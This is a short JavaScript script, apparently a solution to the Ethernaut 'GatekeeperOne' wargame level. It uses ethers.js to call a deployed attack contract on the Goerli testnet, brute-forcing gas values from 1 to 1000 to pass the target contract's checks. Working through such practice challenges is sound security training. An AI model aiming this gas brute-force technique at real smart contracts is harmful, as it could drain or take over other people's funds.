// const { ethers, run, network } = require("hardhat")
require("dotenv").config()

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const ATTACK_ADDRESS = "0x60727B5776cA4C40d9f79c54F6b7D024760320C1";
const GATEKEEPERONE_ADDRESS = "0xf0e84E56a689798764a85b2ce3596b80ce9e0e79";
const contractABI = require("../artifacts/contracts/AttackGatekeeperOne.sol/AttackGatekeeperOne.json");

// Provider
const provider = ethers.getDefaultProvider('goerli');
// Provider
// const alchemyProvider = new ethers.providers.AlchemyProvider(network="goerli", API_KEY);

// Signer
const signer = new ethers.Wallet(PRIVATE_KEY, provider);

// Contract
const attackgkone = new ethers.Contract(ATTACK_ADDRESS, contractABI, signer);

async function main() {

  const [lowerGasBrute, upperGasBrute] = [1, 1000];
  await attackgkone.attack(GATEKEEPERONE_ADDRESS, lowerGasBrute, upperGasBrute)

}

main();
